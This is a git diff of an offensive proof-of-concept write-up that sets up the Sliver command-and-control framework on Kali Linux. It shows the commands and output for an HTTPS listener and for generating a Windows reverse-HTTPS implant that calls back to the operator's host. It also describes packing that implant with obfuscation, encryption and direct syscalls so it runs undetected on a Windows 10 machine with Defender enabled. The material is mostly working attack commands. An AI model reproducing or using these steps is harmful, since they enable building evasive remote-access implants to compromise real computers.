@@ -44,9 +44,9 @@ To avoid AV detection it is recommended to use:
 > etc...
 
 
-=======================================================================================================================================
+=====================================================================================================================
 PoC - Step 1 - Install the SLIVER C2 framework on the Kali Linux box
-=======================================================================================================================================
+=====================================================================================================================
 
 jeff@kali:~/Documents/Tools$ sudo apt-get install sliver
 [sudo] password for jeff: 
@@ -89,9 +89,9 @@ Setting up build-essential (12.9) ...
 Setting up sliver (1.5.31-0kali1) ...                                                                                                                      
 Processing triggers for kali-menu (2021.2.1) ...  
 
-=======================================================================================================================================
+=====================================================================================================================
 PoC - Step 2 - Start the SLIVER server and create an operator on the Kali Linux box
-=======================================================================================================================================
+=====================================================================================================================
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ sudo sliver-server
 
@@ -213,16 +213,34 @@ All hackers gain prowess
 sliver >  
 
 
-===========================================================================================================================================
-PoC - Step 3 - Generate a SLIVER implant (reverse HTTPS payload) and set up a SLIVER HTTPS handler
-===========================================================================================================================================
+=====================================================================================================================
+PoC - Step 3 - Set up a SLIVER HTTPS handler
+=====================================================================================================================
 
-[server] sliver > generate --arch amd64 -f exe --http 192.168.56.104 --save /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe --os Windows
+[server] sliver > help https
 
-[*] Generating new windows/amd64 implant binary
-[*] Symbol obfuscation is enabled
-[*] Build completed in 2m6s
-[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe
+Start an HTTPS listener
+
+Usage:
+======
+  https [flags]
+
+Flags:
+======
+  -c, --cert                    string    PEM encoded certificate file
+  -D, --disable-otp                       disable otp authentication
+  -E, --disable-randomized-jarm           disable randomized jarm fingerprints
+  -d, --domain                  string    limit responses to specific domain
+  -h, --help                              display help
+  -k, --key                     string    PEM encoded private key file
+  -e, --lets-encrypt                      attempt to provision a let's encrypt certificate
+  -L, --lhost                   string    interface to bind server to
+  -J, --long-poll-jitter        string    server-side long poll jitter (default: 2s)
+  -T, --long-poll-timeout       string    server-side long poll timeout (default: 1s)
+  -l, --lport                   int       tcp listen port (default: 443)
+  -p, --persistent                        make persistent across restarts
+  -t, --timeout                 int       command timeout in seconds (default: 60)
+  -w, --website                 string    website name (see websites cmd)
 
 
 [server] sliver > https --lhost 192.168.56.104 --lport 443
@@ -234,13 +252,79 @@ PoC - Step 3 - Generate a SLIVER implant (reverse HTTPS payload) and set up a SL
 [server] sliver >  
 
 
+=====================================================================================================================
+PoC - Step 4 - Generate a SLIVER implant (reverse HTTPS payload)
+=====================================================================================================================
+
+[server] sliver > help generate
+
+Command: generate <options>
+About: Generate a new sliver binary and saves the output to the cwd or a path specified with --save.
+
+<SNIP>
+
+Usage:
+======
+  generate [flags]
+
+Flags:
+======
+  -a, --arch               string    cpu architecture (default: amd64)
+  -c, --canary             string    canary domain(s)
+  -d, --debug                        enable debug features
+  -n, --dns                string    dns connection strings
+  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)
+  -E, --external-builder             use an external builder
+  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
+  -h, --help                         display help
+  -b, --http               string    http(s) connection strings
+  -X, --key-exchange       int       wg key-exchange port (default: 1337)
+  -w, --limit-datetime     string    limit execution to before datetime
+  -x, --limit-domainjoined           limit execution to domain joined machines
+  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
+  -z, --limit-hostname     string    limit execution to specified hostname
+  -L, --limit-locale       string    limit execution to hosts that match this locale
+  -y, --limit-username     string    limit execution to specified username
+  -k, --max-errors         int       max number of connection errors (default: 1000)
+  -m, --mtls               string    mtls connection strings
+  -N, --name               string    agent name
+  -p, --named-pipe         string    named-pipe connection strings
+  -o, --os                 string    operating system (default: windows)
+  -P, --poll-timeout       int       long poll request timeout (default: 360)
+  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
+  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
+  -s, --save               string    directory/file to the binary to
+  -l, --skip-symbols                 skip symbol obfuscation
+  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
+  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
+  -i, --tcp-pivot          string    tcp-pivot connection strings
+  -I, --template           string    implant code template (default: sliver)
+  -t, --timeout            int       command timeout in seconds (default: 60)
+  -g, --wg                 string    wg connection strings
+
+Sub Commands:
+=============
+  beacon  Generate a beacon binary
+  info    Get information about the server's compiler
+  stager  Generate a stager using Metasploit (requires local Metasploit installation)
+
+
+[server] sliver > generate --arch amd64 -f exe --http 192.168.56.104 --save /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe --os Windows
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m6s
+[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe
+
+
 ====================================================================================================================================================
-PoC - Step 4 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
+PoC - Step 5 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
 
 Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques, direct syscalls (etc...) to avoid AV detection.
+Note: Compression is very important beacause the SLIVER implant generated is huge (around 18 Mo)
 
-CC:\temp> dir 
+C:\temp> dir 
  Volume in drive C is Windows
  Volume Serial Number is 9C9C-7212
 
@@ -249,7 +333,7 @@ CC:\temp> dir
 02/01/2023  04:00    <DIR>          .
 02/01/2023  04:00    <DIR>          ..
 23/12/2022  00:51         5,407,744 Packed-SliverRevShell.exe
-31/12/2022  06:51        18,218,496 SliverRevShell2.exe
+31/12/2022  06:51        18,218,496 SliverRevShell.exe
                2 File(s)     23,626,240 bytes
                2 Dir(s)  93,179,334,656 bytes free
                
